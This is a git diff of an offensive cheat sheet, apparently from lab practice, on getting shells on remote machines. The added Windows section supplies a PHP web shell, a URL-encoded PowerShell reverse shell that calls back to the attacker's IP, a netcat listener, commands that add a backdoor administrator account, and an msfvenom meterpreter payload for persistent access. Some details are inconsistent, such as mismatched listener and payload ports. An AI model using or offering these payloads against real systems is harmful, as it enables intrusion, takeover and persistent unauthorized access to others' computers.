@@ -1,7 +1,9 @@
 # Various-process-of-getting-shell-access
 Here We'll discuss how to get a shell in multiple ways -->
 
-## For-Linux-Remote-PC:
+## _Always do nmap search for any machine and if necessary gobuster, nikto, metasploit etc whatever you need_
+
+## _For-Linux-Remote-PC:_
 
 First assume your **ATTACK/HACKER PC IP** is **10.10.201.217** & your **REMOTE/ATTACKING/TARGET PC IP** is **10.10.152.101**
 
@@ -127,4 +129,47 @@ If your IP is **10.10.10.5**, what syntax would you use to connect back to this 
 
 
 
+## _For-Windows-Remote-PC:_
 
+First assume your **ATTACK/HACKER PC IP** is **10.10.153.17** & your **REMOTE/ATTACKING/TARGET PC IP** is **10.10.112.158**
+
+
+### _Type 1: If you can upload any file to webserver and access it from browser_
+
+ use the basic php command which will allow to type & execute any windows cmd command from browser. use the below code in and save it in a file and upload it in remote/attacking pc's webserver
+
+```
+ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+Then open the uploaded file in browser. then add ?cmd= at the end of syntax and type any command like ***ipconfig*** to check the ip of the machine. if that works and shows IP of machine then add the powershell command like below. 
+
+<pre><code><b> http://10.10.112.158/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.10.153.17%27%2C1337)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22%0A </b></code></pre>
+
+## _Change the ip and port and powershell command according to your requirement depending on your machine condition_
+
+Now in your attacker kali pc terminal type ***nc -lvnp 1234*** and the execute the above command in browser and you'll see you've got a access to remote pc.
+Now try the ***whoami*** command to check the **user prevelige** of your access. If it shows
+```
+NT administrator/system
+```
+Then you have administrator access to the remote pc and you can exploit it anyway you want. :smiling_imp:
+
+### _Now You can create User with password and access to the remote pc using graphical access using RDP (Remote Desktop Protocol)_
+So to create user with administrative privilige use the both commands. 1st one is for creating user with password and 2nd one is for assiging administrative access to it.
+
+<pre><code><b> net user Hacker Hack3d!! /add </b></code></pre>  
+
+<pre><code><b> net localgroup administrators Hacker /add </b></code></pre>   
+
+after that in your local pc **create a exe file using msfvenom** so you can access anytime later if that files gets on. Use the below commands
+
+<pre><code><b> msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.153.17 LPORT=4444 /add </b></code></pre>  
+
+it'll prepare reverse shell access whenever it turns on and you can access the remote pc from your attacking pc using netcat. if possible install NMAP in remote pc which will allow both way netcat command access ( **but it's risky, avoid if you can**)
+
+### _Type 2: If you can upload php_reverse_shell to webserver and access it from browser_
+
+create and upload the php reverse shell and if you get the shell then follow the above types rest stages.
+
+### This same is applicable for other other processes. once you have access using any type exploit, then you can use nc, socat or anything you want 
+ 
